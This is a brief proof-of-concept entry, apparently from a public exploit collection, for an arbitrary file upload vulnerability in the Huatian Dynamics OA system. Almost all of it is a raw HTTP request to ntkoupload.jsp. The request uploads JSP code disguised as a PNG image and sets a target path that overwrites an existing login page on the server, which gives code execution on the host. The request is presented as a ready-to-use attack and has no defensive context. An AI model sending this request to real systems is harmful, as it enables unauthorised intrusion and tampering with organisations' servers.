# htoa_upload_fileupload

from: https://github.com/wy876/POC/blob/main/%E5%8D%8E%E5%A4%A9%E5%8A%A8%E5%8A%9B/%E5%8D%8E%E5%A4%A9%E5%8A%A8%E5%8A%9BOA%E7%B3%BB%E7%BB%9Fupload.jsp%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md
product: 华天动力OA

```
POST /OAapp/htpages/app/module/trace/component/fileEdit/ntkoupload.jsp HTTP/1.1
Host: x.x.x.x:xx
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryzRSYXfFlXqk6btQm
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Content-Length: 389

------WebKitFormBoundaryzRSYXfFlXqk6btQm
Content-Disposition: form-data; name="EDITFILE"; filename="xxx.txt"
Content-Type: image/png

<%out.print("123");%>
------WebKitFormBoundaryzRSYXfFlXqk6btQm
Content-Disposition: form-data; name="newFileName"

D:/htoa/Tomcat/webapps/OAapp/htpages/app/module/login/normalLoginPageForOther.jsp
------WebKitFormBoundaryzRSYXfFlXqk6btQm--
```
